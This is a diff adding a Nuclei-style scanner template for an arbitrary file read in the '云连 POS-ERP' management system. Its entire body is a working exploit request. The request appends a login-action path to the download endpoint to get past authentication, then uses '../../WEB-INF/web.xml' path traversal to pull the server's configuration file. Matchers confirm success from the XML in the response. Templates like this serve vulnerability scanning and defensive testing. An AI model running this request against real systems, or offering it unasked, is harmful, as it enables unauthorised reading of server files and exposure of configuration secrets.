@@ -1,0 +1,37 @@
+id: Yunlian-POS-ERP-download_action-File-reading
+
+info:
+  name: 云连-POS-ERP管理系统 download.action 任意文件读取
+  author: HuanXiong
+  severity: high
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /admin/file!download.action;admin!login.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        downloadFile=../../WEB-INF/web.xml
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<context-param>'
+          - '</context-param>'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
